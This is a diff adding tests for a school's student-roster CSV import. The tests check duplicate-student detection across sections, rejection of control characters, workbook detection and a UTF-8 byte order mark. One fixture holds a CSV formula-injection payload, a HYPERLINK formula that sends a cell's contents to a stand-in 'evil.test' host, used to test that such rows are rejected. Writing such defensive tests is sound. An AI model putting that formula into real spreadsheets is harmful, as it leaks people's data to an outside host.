@@ -332,3 +332,93 @@ test("the class can be written as her page shows it, in her language", { skip },
     assert.deepEqual(Object.values(made).map((r) => [r.grade, r.section]).sort(), [[5, "A"], [6, null], [6, null]]);
   });
 });
+
+// ── Review findings on this feature (second round) ──────────────────────────
+//
+// Found by independent reviewers of the first version; each test below failed
+// against it. A student with no section is on EVERY section's roster
+// (lib/teaching roster()), so for "already on the class list" a missing section
+// overlaps all of them; and a cell is one line of text, so a file that smuggles
+// in a line break (a formula that survives the roster download) or a NUL byte
+// (which Postgres refuses, sinking the whole batch) is that row's problem.
+
+const kid = (w: TeachingWorld, name: string, roll: string | null, section: string | null) =>
+  w.f.row("learners", { class_id: w.six, school_id: w.school, grade: 6, name, roll_number: roll, section });
+
+test("a student without a section overlaps every section of the class: not added twice", { skip }, async () => {
+  await inWorld(async (w) => {
+    await kid(w, "Pema", "9", "A");
+    await kid(w, "Quinn", "8", null);
+    as(w.teacherUser, "teacher");
+
+    const csv = [
+      "name,rollNumber,section,class", // 1
+      "Pema,,,Grade 6 (all sections)", // 2  Pema is in section A already; no section here means "every section"
+      "Newcomer,9,,Grade 6 (all sections)", // 3  roll 9 is Pema's, in A
+      "Quinn,,A,6", // 4  Quinn is in no section, so also in A
+      "Other,8,B,6", // 5  roll 8 is Quinn's, in every section
+      "Pema,,B,6", // 6  a Pema of section B is another child: fine
+      "Zed,,A,6", // 7  fine
+      "Zed,,,6", // 8  no section overlaps Zed of A on line 7
+    ].join("\n");
+    const res = await upload(csvForm(csv));
+    assert.match(res?.ok ?? "", /^2 students added\. 5 rows were not imported:/, JSON.stringify(res));
+    const at = (line: number) => (res?.issues ?? []).find((i) => i.startsWith(`Line ${line}:`)) ?? "";
+    assert.match(at(2), /Pema is already in Grade 6 A\./, "it says where the Pema on the list is");
+    assert.match(at(3), /Roll number 9 is already used in Grade 6 A\./);
+    assert.match(at(4), /Quinn is already in Grade 6\./);
+    assert.match(at(5), /Roll number 8 is already used in Grade 6\./);
+    assert.match(at(8), /Zed repeats line 7\./);
+    assert.deepEqual((res?.issues ?? []).map((i) => Number(/^Line (\d+):/.exec(i)![1])), [2, 3, 4, 5, 8]);
+    assert.deepEqual(
+      (await w.c.query(`SELECT name, section FROM learners WHERE class_id = $1 AND deleted_at IS NULL AND name IN ('Pema', 'Zed') ORDER BY name, section`, [w.six])).rows,
+      [{ name: "Pema", section: "A" }, { name: "Pema", section: "B" }, { name: "Zed", section: "A" }],
+    );
+  });
+});
+
+test("a line break or another control character in a cell is that row's problem, and the other rows still land", { skip }, async () => {
+  await inWorld(async (w) => {
+    as(w.teacherUser, "teacher");
+    const csv = [
+      "name,rollNumber,section,class", // 1
+      "Good One,61,,5", // 2
+      '"Bad\u0000Name",62,,5', // 3  a NUL byte: Postgres refuses it, and with it the whole batch
+      `"=HYPERLINK(""http://evil.test/?""&B2,\n""click"")",63,,5`, // 4  a formula that spans lines survives the roster download
+      '"Tab\tName",64,,5', // 5
+      'Roll,"6\u00075",,5', // 6  a control character in the roll number
+      'Section,66,"A\u0000",5', // 7 ...and in the section
+      "Good Two,67,,5", // 8
+    ].join("\n");
+    const res = await upload(csvForm(csv));
+    assert.match(res?.ok ?? "", /^2 students added\. 5 rows were not imported:/, JSON.stringify(res));
+    assert.deepEqual(Object.keys(await learnersOf(w, ["Good One", "Good Two"])).sort(), ["Good One", "Good Two"]);
+    assert.deepEqual((res?.issues ?? []).map((i) => Number(/^Line (\d+):/.exec(i)![1])), [3, 4, 5, 6, 7]);
+    for (const line of res?.issues ?? []) assert.match(line, /line break or another character that cannot be used/);
+    assert.equal(await total(w), 6 + 2, "nothing else was stored");
+  });
+});
+
+test("a workbook or a UTF-16 file is told to be saved as CSV, not told its columns are missing", { skip }, async () => {
+  await inWorld(async (w) => {
+    as(w.teacherUser, "teacher");
+    const xlsx = `PK\u0003\u0004${"\u0000".repeat(40)}[Content_Types].xml`;
+    const utf16 = [..."name,class\nAsha,5\n"].join("\u0000");
+    for (const [name, content] of [["students.xlsx", xlsx], ["students.csv", utf16]] as const) {
+      const err = (await upload(csvForm(content, {}, name)))?.error ?? "";
+      assert.match(err, /not a plain CSV/, name);
+      assert.match(err, /Save as/, name);
+    }
+    assert.equal(await total(w), 6);
+  });
+});
+
+test("the template opens in Excel as UTF-8", { skip }, async () => {
+  await inWorld(async (w) => {
+    as(w.teacherUser, "teacher");
+    const bytes = new Uint8Array(await (await template()).arrayBuffer());
+    assert.deepEqual([...bytes.slice(0, 3)], [0xef, 0xbb, 0xbf], "a byte order mark: names she types into it in Devanagari or Tibetan must not turn to mojibake");
+    // (String.trim() would drop the mark itself: U+FEFF counts as white space.)
+    assert.equal(new TextDecoder("utf-8", { ignoreBOM: true }).decode(bytes).replace(/\r?\n$/, ""), "﻿name,rollNumber,section,class");
+  });
+});
